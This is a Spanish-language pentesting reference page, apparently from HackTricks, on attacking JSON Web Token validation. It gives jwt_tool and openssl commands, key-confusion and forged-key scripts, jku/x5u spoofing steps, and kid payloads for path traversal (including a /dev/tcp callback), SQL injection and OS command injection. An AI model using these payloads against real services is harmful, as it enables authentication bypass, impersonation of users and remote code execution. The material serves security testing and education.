# Vulnerabilidades de JWT (Json Web Tokens)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Consejo para cazar recompensas**: **reg√≠strate** en **Intigriti**, una plataforma premium de **bug bounty creada por hackers, para hackers**. √önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo, y comienza a ganar recompensas de hasta **$100,000**.

{% embed url="https://go.intigriti.com/hacktricks" %}

**Parte de este post fue tomada de:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor de la excelente herramienta para pentesting de JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Victorias R√°pidas**

Ejecuta [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) con el modo `All Tests!` y espera a las l√≠neas verdes
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Si tienes suerte, la herramienta encontrar√° alg√∫n caso en el que la aplicaci√≥n web est√° comprobando incorrectamente el JWT:

![](<../.gitbook/assets/image (435).png>)

Luego, puedes buscar la solicitud en tu proxy o volcar el JWT utilizado para esa solicitud usando jwt_tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Alterar datos sin modificar nada

Puedes alterar los datos dejando la firma tal cual y comprobar si el servidor est√° verificando la firma. Intenta cambiar tu nombre de usuario a "admin", por ejemplo.

#### **¬øSe verifica el token?**

* Si ocurre un mensaje de error, la firma se est√° verificando - lee cualquier informaci√≥n de error detallada que pueda revelar algo sensible.
* Si la p√°gina devuelta es diferente, la firma se est√° verificando.
* Si la p√°gina es la misma, entonces la firma no se est√° verificando - ¬°es hora de empezar a alterar las afirmaciones del Payload para ver qu√© puedes hacer!

### Origen

Comprueba d√≥nde se origin√≥ el token en el historial de solicitudes de tu proxy. Deber√≠a crearse en el servidor, no en el cliente.

* Si se vio por primera vez proveniente del lado del cliente, entonces la **clave** es accesible al c√≥digo del lado del cliente - ¬°b√∫scala!
* Si se vio por primera vez proveniente del servidor, todo est√° bien.

### Duraci√≥n

Comprueba si el token dura m√°s de 24h... tal vez nunca expira. Si hay un campo "exp", verifica si el servidor lo est√° manejando correctamente.

### Fuerza bruta del secreto HMAC

[**Ver esta p√°gina.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Modificar el algoritmo a Ninguno (CVE-2015-9235)

Establece el algoritmo utilizado como "Ninguno" y elimina la parte de la firma.

Usa la extensi√≥n de Burp llamada "JSON Web Token" para probar esta vulnerabilidad y para cambiar diferentes valores dentro del JWT (env√≠a la solicitud a Repeater y en la pesta√±a "JSON Web Token" puedes modificar los valores del token. Tambi√©n puedes seleccionar poner el valor del campo "Alg" a "Ninguno").

### Cambiar el algoritmo RS256(asim√©trico) a HS256(sim√©trico) (CVE-2016-5431/CVE-2016-10555)

El algoritmo HS256 utiliza la clave secreta para firmar y verificar cada mensaje.\
El algoritmo RS256 utiliza la clave privada para firmar el mensaje y la clave p√∫blica para la autenticaci√≥n.

Si cambias el algoritmo de RS256 a HS256, el c√≥digo del back end usa la clave p√∫blica como clave secreta y luego utiliza el algoritmo HS256 para verificar la firma.

Entonces, usando la clave p√∫blica y cambiando RS256 a HS256 podr√≠amos crear una firma v√°lida. Puedes obtener el certificado del servidor web ejecutando esto:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nueva clave p√∫blica en el encabezado

Un atacante incorpora una nueva clave en el encabezado del token y el servidor utiliza esta nueva clave para verificar la firma (CVE-2018-0114).

Esto se puede hacer con la extensi√≥n "JSON Web Tokens" de Burp.\
(Env√≠a la solicitud al Repeater, dentro de la pesta√±a JSON Web Token selecciona "CVE-2018-0114" y env√≠a la solicitud).

### Suplantaci√≥n de JWKS

Si el token utiliza una declaraci√≥n de encabezado ‚Äújku‚Äù, entonces verifica la URL proporcionada. Esta deber√≠a apuntar a una URL que contenga el archivo JWKS que tiene la Clave P√∫blica para verificar el token. Altera el token para que el valor de jku apunte a un servicio web que puedas monitorear el tr√°fico.

Si obtienes una interacci√≥n HTTP ahora sabes que el servidor est√° intentando cargar claves desde la URL que est√°s proporcionando. _Usa la bandera -S de jwt\_tool junto con el argumento -u_ [_http://example.com_](http://example.com) _para generar un nuevo par de claves, inyectar tu URL proporcionada, generar un JWKS que contenga la Clave P√∫blica y firmar el token con la Clave Privada_

### Problemas con "kid"

`kid` es una declaraci√≥n de encabezado opcional que contiene un identificador de clave, particularmente √∫til cuando tienes m√∫ltiples claves para firmar los tokens y necesitas buscar la correcta para verificar la firma.

#### Problemas con "kid" - revelar clave

Si se utiliza la declaraci√≥n "kid" en el encabezado, verifica el directorio web para ese archivo o una variaci√≥n del mismo. Por ejemplo, si `"kid":"key/12345"`, entonces busca _/key/12345_ y _/key/12345.pem_ en la ra√≠z web.

#### Problemas con "kid" - traversal de ruta

Si se utiliza la declaraci√≥n "kid" en el encabezado, verifica si puedes usar un archivo diferente en el sistema de archivos. Elige un archivo cuyo contenido puedas predecir, o intenta `"kid":"/dev/tcp/tuIP/tuPuerto"` para probar la conectividad, o incluso algunos payloads de **SSRF**...\
_Usa la bandera -T de jwt\_tool para alterar el JWT y cambiar el valor de la declaraci√≥n kid, luego elige mantener la firma original_
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Utilizando archivos dentro del host con contenido conocido tambi√©n puedes falsificar un JWT v√°lido. Por ejemplo, en sistemas linux el archivo `/proc/sys/kernel/randomize_va_space` tiene el valor establecido en **2**. Entonces, colocando esa **ruta** dentro del par√°metro "**kid**" y usando "**2**" como la **contrase√±a sim√©trica** para generar el JWT deber√≠as poder generar un nuevo JWT v√°lido.

#### Problemas con "kid" - Inyecci√≥n SQL

En un escenario donde el contenido de "kid" se utiliza para recuperar la contrase√±a de la base de datos, podr√≠as cambiar el contenido dentro del par√°metro "kid" a: `non-existent-index' UNION SELECT 'ATTACKER';-- -` y luego firmar el JWT con la clave secreta `ATTACKER`.

#### Problemas con "kid" - Inyecci√≥n en el Sistema Operativo

En un escenario donde el par√°metro "kid" contiene una ruta al archivo con la clave y esta ruta se utiliza **dentro de un comando ejecutado** podr√≠as obtener RCE y exponer la clave privada con un contenido como el siguiente: `/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### Ataques varios

Las siguientes son debilidades conocidas que deben ser probadas.

**Ataques de retransmisi√≥n entre servicios**

Algunas aplicaciones web utilizan un servicio JWT 'confiable' para generar y gestionar tokens para ellos. En el pasado ha ocurrido que un token generado para uno de los clientes del servicio JWT puede ser aceptado por otro de los clientes del servicio JWT.\
Si observas que el JWT se emite o renueva a trav√©s de un servicio de terceros, vale la pena identificar si puedes registrarte en otra de las cuentas de ese servicio con tu mismo nombre de usuario/correo electr√≥nico. Si es as√≠, intenta tomar ese token y reutilizarlo en una solicitud a tu objetivo. ¬øEs aceptado?

* Si tu token es aceptado, entonces puedes tener un problema cr√≠tico que te permite suplantar la cuenta de cualquier usuario. SIN EMBARGO, ten en cuenta que si te registras en una aplicaci√≥n de terceros, es posible que necesites buscar permiso para pruebas m√°s amplias en caso de que entre en una zona gris legal.

**¬øSe verifica exp?**

La afirmaci√≥n "exp" del Payload se utiliza para verificar la caducidad de un token. Como los JWT a menudo se utilizan en ausencia de informaci√≥n de sesi√≥n, deben manejarse con cuidado - en muchos casos, capturar y reutilizar el JWT de otra persona te permitir√° hacerse pasar por ese usuario.\
Una mitigaci√≥n contra los ataques de reutilizaci√≥n de JWT (que es aconsejada por el RFC de JWT) es usar la afirmaci√≥n "exp" para establecer un tiempo de caducidad para el token. Tambi√©n es importante establecer las comprobaciones relevantes en la aplicaci√≥n para asegurarse de que este valor se procese y el token sea rechazado cuando haya caducado. Si el token contiene una afirmaci√≥n "exp" y el tiempo de prueba lo permite - intenta almacenar el token y reutilizarlo despu√©s de que haya pasado el tiempo de caducidad. _Usa la bandera -R de jwt\_tool para leer el contenido del token, que incluye el an√°lisis de la marca de tiempo y la comprobaci√≥n de la caducidad (marca de tiempo en UTC)_

* Si el token todav√≠a se valida en la aplicaci√≥n, entonces esto puede ser un riesgo de seguridad ya que el token puede NUNCA expirar.

### x5u y jku

#### jku

jku significa **URL del Conjunto de Claves JWK**.\
Si el token utiliza una afirmaci√≥n de **Encabezado** ‚Äú**jku**‚Äù, entonces **revisa la URL proporcionada**. Esto deber√≠a apuntar a una URL que contenga el archivo JWKS que tiene la Clave P√∫blica para verificar el token. Altera el token para que el valor de jku apunte a un servicio web que puedas monitorear el tr√°fico.

Primero necesitas crear un nuevo certificado con nuevas claves privadas y p√∫blicas
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Entonces puedes usar, por ejemplo, [**jwt.io**](https://jwt.io) para crear el nuevo JWT con **las claves p√∫blica y privada creadas y apuntando el par√°metro jku al certificado creado.** Para crear un certificado jku v√°lido puedes descargar el original y cambiar los par√°metros necesarios.

Puedes obtener los par√°metros "e" y "n" de un certificado p√∫blico utilizando:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. Una URI que apunta a un conjunto de certificados p√∫blicos X.509 (un est√°ndar de formato de certificado) codificados en forma PEM. El primer certificado en el conjunto debe ser el utilizado para firmar este JWT. Los certificados subsiguientes firman cada uno al anterior, completando as√≠ la cadena de certificados. X.509 est√° definido en RFC 52807. Se requiere seguridad de transporte para transferir los certificados.

Intenta **cambiar este encabezado a una URL bajo tu control** y verifica si se recibe alguna solicitud. En ese caso, **podr√≠as manipular el JWT**.

Para forjar un nuevo token usando un certificado controlado por ti, necesitas crear el certificado y extraer las claves p√∫blica y privada:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Entonces puedes usar, por ejemplo, [**jwt.io**](https://jwt.io) para crear el nuevo JWT con las **claves p√∫blicas y privadas creadas y apuntando el par√°metro x5u al certificado .crt creado.**

![](<../.gitbook/assets/image (439).png>)

Tambi√©n puedes abusar de ambas vulnerabilidades **para SSRFs**.

#### x5c

Este par√°metro puede contener el **certificado en base64**:

![](<../.gitbook/assets/image (440).png>)

Si el atacante **genera un certificado autofirmado** y crea un token falsificado usando la clave privada correspondiente y reemplaza el valor del par√°metro "x5c" con el certificado reci√©n generado y modifica los otros par√°metros, a saber, n, e y x5t, entonces esencialmente el token falsificado ser√≠a aceptado por el servidor.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Clave P√∫blica Incorporada (CVE-2018-0114)

Si el JWT tiene incorporada una clave p√∫blica como en el siguiente escenario:

![](<../.gitbook/assets/image (438).png>)

Usando el siguiente script de nodejs es posible generar una clave p√∫blica a partir de esos datos:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Es posible generar una nueva clave privada/p√∫blica, incrustar la nueva clave p√∫blica dentro del token y usarla para generar una nueva firma:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Puedes obtener "n" y "e" utilizando este script de nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finalmente, utilizando la clave p√∫blica y privada y los nuevos valores de "n" y "e", puedes usar [jwt.io](https://jwt.io) para forjar un nuevo JWT v√°lido con cualquier informaci√≥n.

### JTI (Identificador de JWT)

El reclamo JTI (Identificador de JWT) proporciona un identificador √∫nico para un Token JWT. Puede ser utilizado para prevenir la repetici√≥n del token.\
Sin embargo, imagina una situaci√≥n donde la longitud m√°xima del ID es 4 (0001-9999). La solicitud 0001 y 10001 van a usar el mismo ID. As√≠ que si el backend est√° incrementando el ID en cada solicitud, podr√≠as abusar de esto para **repetir una solicitud** (necesitando enviar 10000 solicitudes entre cada repetici√≥n exitosa).

### Reclamos Registrados de JWT

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Herramientas

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Consejo para cazar recompensas**: **reg√≠strate** en **Intigriti**, una plataforma de recompensas por errores premium creada por hackers, para hackers. ¬°√önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Aprende a hackear AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
